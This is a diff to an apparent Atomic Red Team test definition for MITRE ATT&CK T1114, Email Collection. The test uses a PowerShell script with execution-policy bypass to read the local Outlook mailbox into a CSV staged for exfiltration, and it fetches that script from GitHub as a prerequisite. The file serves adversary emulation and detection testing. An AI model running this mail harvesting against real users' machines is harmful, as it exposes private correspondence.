@@ -4,22 +4,39 @@ display_name: Email Collection
 attack_link: https://attack.mitre.org/wiki/Technique/T1114
 
 atomic_tests:
-- name: T1114 Email Collection with PowerShell
-
+- name: Email Collection with PowerShell Get-Inbox
   description: |
     Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.
-  
+    Successful execution will produce stdout message stating "Please be patient, this may take some time...". Upon completion, final output will be a mail.csv file.
+
+    Note: Outlook is required, but no email account necessary to produce artifacts.
   supported_platforms:
     - windows
   input_arguments:
+    file_path:
+      description: File path for Get-Inbox.ps1
+      type: String
+      default: PathToAtomicsFolder\T1114\src
     output_file:
       description: Output file path
       type: String
-      default: $home\desktop\mail.csv
+      default: $env:TEMP\mail.csv
+
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        Get-Inbox.ps1 must be located at #{file_path}
+      prereq_command: |
+        if (Test-Path #{file_path}\Get-Inbox.ps1) {exit 0} else {exit 1}
+      get_prereq_command: |
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1114/src/Get-Inbox.ps1" -OutFile "#{file_path}\Get-Inbox.ps1"
+
   executor:
-    name: command_prompt
+    name: powershell
     elevation_required: false
     command: |
-      powershell -executionpolicy bypass -command $PathToAtomicsFolder\T1114\Get-Inbox.ps1 -file #{output_file}
+      powershell -executionpolicy bypass -command #{file_path}\Get-Inbox.ps1 -file #{output_file}
+
     cleanup_command: |
-      del #{output_file} >nul 2>&1
+      Remove-Item #{output_file} -Force -ErrorAction Ignore
+
